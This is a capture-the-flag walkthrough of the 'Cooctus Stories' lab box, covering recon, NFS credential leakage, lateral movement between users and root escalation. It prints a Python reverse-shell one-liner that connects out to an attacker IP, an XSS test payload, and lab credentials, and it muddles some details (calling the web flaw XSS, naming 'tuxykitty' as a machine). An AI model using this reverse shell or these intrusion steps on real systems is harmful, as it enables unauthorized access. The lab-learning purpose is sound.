# Cooctus Stories

## Previously on Cooctus Tracker

Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity during a late-night shift while browsing shiba pictures, and managed to capture packets as the attack happened. (From *Overpass 2 - Hacked* by NinjaJc01)

## Present Times

Further investigation revealed that the hack was made possible with the help of an insider threat. Paradox helped the Cooctus Clan hack Overpass in exchange for the secret shiba stash. Now, we have discovered a private server deep beneath the boiling hot sands of the Saharan Desert. We suspect it is operated by the Clan, and it's our objective to uncover their plans.

> **Note:** A stable shell is recommended, so try to SSH into users when possible.

### Objectives

- Find out that Paradox is nomming cookies
- Find out what Szymex is working on
- Find out what Tux is working on
- Find out what Varg is working on
- Get full root privileges

---

## Initial Recon

```bash
sudo nmap -sS -sV -sC -append-output 10.82.156.131
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-20 22:37 BST
Nmap scan report for 10.82.156.131
Host is up (0.033s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e5:44:62:91:90:08:99:5d:e8:55:4f:69:ca:02:1c:10 (RSA)
|   256 e5:a7:b0:14:52:e1:c9:4e:0d:b8:1a:db:c5:d6:7e:f0 (ECDSA)
|_  256 02:97:18:d6:cd:32:58:17:50:43:dd:d2:2f:ba:15:53 (ED25519)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37245/udp   mountd
|   100005  1,2,3      40859/tcp6  mountd
|   100005  1,2,3      47778/udp6  mountd
|   100005  1,2,3      50321/tcp   mountd
|   100021  1,3,4      39561/udp6  nlockmgr
|   100021  1,3,4      40377/tcp6  nlockmgr
|   100021  1,3,4      46559/tcp   nlockmgr
|   100021  1,3,4      59398/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs     3-4 (RPC #100003)
8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
|_http-title: CCHQ
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
```

```bash
gobuster dir -w raft-medium-words.txt -u http://10.82.156.131:8080 -x php,html,txt
```

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.82.156.131:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 556]
```

---

## NFS Enumeration

I noticed that there was an NFS port open, which could potentially contain leftover data.

1. Enumerated the available NFS exports:
   ```bash
   showmount -e 10.82.156.131
   ```
2. Created a mount point:
   ```bash
   sudo mkdir /mnt/nfs
   ```
3. Mounted the share:
   ```bash
   sudo mount -t nfs 10.82.156.131:/var/nfs /mnt/nfs
   ```
4. Listed the contents:
   ```bash
   ls -lah /mnt/nfs
   ```

This revealed a file named `credentials.bak`. Running `cat /mnt/nfs/credentials.bak` revealed the credentials:

- **Username:** `paradoxial.test`
- **Password:** `ShibaPretzel79`

These could potentially be used to access other services on the target system.

## Web Login

Logging in with the credentials on `http://10.82.156.131:8080/login` (found earlier) takes us to a new page:

```
Cooctus Attack Troubleshooter (C.A.T)

Welcome Cooctus Recruit!

Here, you can test your exploits in a safe environment before launching them
against your target. Please bear in mind, some functionality is still under
development in the current version.
```

I tested an XSS payload:

```html
<img src="x" onerror="alert('test')">
```

This was successful, confirming the page was vulnerable. From here I used a Python reverse shell payload:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.132.61",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

After gaining a shell, I retrieved the first flag:

```bash
cat user.txt
```

**Flag:** `THM{2dccd1ab3e03990aea77######a2}`

---

## Pivoting to Szymex

The next part of the challenge is to access the flag inside Szymex's account. Of course, it's restricted, so we need to find a way in.

There's a Python file called `sniffincats.py` that encodes a password from `mysupersecretpassword.cat`. I asked an AI to write a script to automatically decrypt the password:

```python
def decode(encrypted):
    dec = ''
    for i in encrypted:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            dec += chr(num)
        else:
            dec += chr(ord(i) + 13)
    return dec

# The encrypted password from the code
encrypted_pw = "pureelpbxr"

# Decrypt it
decrypted_pw = decode(encrypted_pw)
print(f"Decrypted password: {decrypted_pw}")
```

This returned the password **`cherrycoke`**. I assumed it was the password for the Szymex account, so I SSH'd in:

```bash
ssh szymex@10.82.166.90
```

And obtained the next flag:

```bash
cat user.txt
```

---

## Collecting the Fragments (Tux)

To obtain the next flag, we must collect 3 different fragments and combine them into a hash.

### Fragment 1 — Obfuscated C Code

Inside the first folder there was an obfuscated C script (`nootcode.c`):

```bash
szymex@cchq:/home/tux/tuxling_1$ cat nootcode.c
```

```c
#include <stdio.h>

#define noot int
#define Noot main
#define nOot return
#define noOt (
#define nooT )
#define NOOOT "f96"
#define NooT ;
#define Nooot nuut
#define NOot {
#define nooot key
#define NoOt }
#define NOOt void
#define NOOT "NOOT!\n"
#define nooOT "050a"
#define noOT printf
#define nOOT 0
#define nOoOoT "What does the penguin say?\n"
#define nout "d61"

noot Noot noOt nooT NOot
    noOT noOt nOoOoT nooT NooT
    Nooot noOt nooT NooT

    nOot nOOT NooT
NoOt

NOOt nooot noOt nooT NOot
    noOT noOt NOOOT nooOT nout nooT NooT
NoOt

NOOt Nooot noOt nooT NOot
    noOT noOt NOOT nooT NooT
NoOt
```

Honestly, I had no idea what I was looking at, so I asked an AI to decrypt (deobfuscate) it, which gave me:

```c
#include <stdio.h>

int main()
{
    printf("What does the penguin say?\n");
    nuut();

    return 0;
}

void key()
{
    printf("f96" "050a" "d61");
}

void nuut()
{
    printf("NOOT!\n");
}
```

Which outputs:

```
What does the penguin say?
NOOT!
f96050ad61
```

**Fragment 1:** `f96050ad61`

### Fragment 2 — Hidden Directory + PGP

The second folder was hidden, so a plain `ls -la` found nothing. I ran:

```bash
find / -name "tuxling_2" 2>/dev/null
```

This successfully located the folder at `/media/tuxling_2`. Inside, a note told me to decrypt a PGP key — simply import the key, then decrypt the message:

```bash
szymex@cchq:/media/tuxling_2$ ls
fragment.asc  note  private.key

szymex@cchq:/media/tuxling_2$ gpg --import private.key
gpg: key B70EB31F8EF3187C: public key "TuxPingu" imported
gpg: key B70EB31F8EF3187C: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

szymex@cchq:/media/tuxling_2$ gpg --decrypt fragment.asc
gpg: Note: secret key 97D48EB17511A6FA expired at Mon 20 Feb 2023 07:58:30 PM UTC
gpg: encrypted with 3072-bit RSA key, ID 97D48EB17511A6FA, created 2021-02-20
      "TuxPingu"

The second key fragment is: 6eaf62818d
```

**Fragment 2:** `6eaf62818d`

### Fragment 3 — Home Directory

The last fragment was just sitting in a text file in the home directory (boring!):

**Fragment 3:** `637b56db1552`

### Combining the Fragments

Combining the fragments gives:

```
f96050ad616eaf62818d637b56db1552
```

This is an MD5 hash. I ran it through CrackStation and got the password for the next machine: **`tuxykitty`**

After logging in, we get the next flag:

**Flag:** `THM{592d07d6c2b7b3b3e######2edbd6f1}`

---

## Moving to Tux

In the new `tux` directory, there wasn't much interesting going on at first glance. There was a Python file I didn't have permission to access, and a `src` folder containing project code — again, nothing immediately useful.

I ran `ls -la` to check for hidden files and found a `.git` folder that didn't show up under a normal `ls`. This confirmed Git was installed, which I verified with `git`. Using `git show` revealed a password hidden in the commit history:

**Password:** `slowroastpork`

After logging in, we get the next flag:

**Flag:** `THM{3a33063a4a8a5805d######11a53286e6}`

---

## Getting Root

The next flag is in the root directory. The hint on TryHackMe is:

> "To mount or not to mount. That is the question."

So I assumed it would involve a mounting-related exploit.

Running `sudo -l` showed we have permission to unmount without a password:

```
(root) NOPASSWD: /bin/umount
```

I then ran `findmnt` to check mounted drives and found an interesting one: `/opt/CooctFS`.

Following the hint, I unmounted the drive and hoped for the best:

```bash
sudo umount /opt/CooctFS
```

After running the command and checking the drive again, I found a new folder called `root` containing `root.txt`. Running `ls -la` to check for hidden files (this CTF really loves hidden files) revealed a `.ssh` folder containing a private key, which gave root access:

```bash
nano key
chmod 600 key
ssh -i key root@10.82.166.90
cat /root/root.txt
```

**Final Flag:** `THM{H4CK3D_BY_C00CTUS_CL4N}`

---

## Summary

- **Recon:** Nmap revealed SSH, NFS, and a Werkzeug web app on port 8080. Gobuster found a `/login` page.
- **NFS leak:** Mounted an exposed NFS share and found a `credentials.bak` file with valid web login creds.
- **Web app → RCE:** Logged into the "C.A.T" tool, confirmed an XSS flaw, then used a Python reverse shell payload to get an initial foothold (user flag #1).
- **Szymex:** Decoded a Caesar-cipher-style password from `sniffincats.py` to SSH in as `szymex` (user flag #2).
- **Tux fragments:** Pieced together an MD5 hash from three hidden fragments (deobfuscated C code, a GPG-encrypted note, and a plain text file), cracked it, and used the password to move laterally to `tuxykitty` (user flag #3).
- **Tux → Git history:** Found a hidden `.git` folder and pulled a password out of the commit history (user flag #4).
- **Privilege escalation:** Abused a passwordless `sudo umount` permission on a mounted overlay (`/opt/CooctFS`) to expose a hidden `root` folder containing an SSH private key, granting full root access (final flag).

**Key takeaways:** the box leaned heavily on hidden files/directories, encoded or obfuscated secrets, and misconfigured permissions (NFS exports, `sudo` rules, mount points) rather than complex exploits — enumeration patience paid off more than anything else.
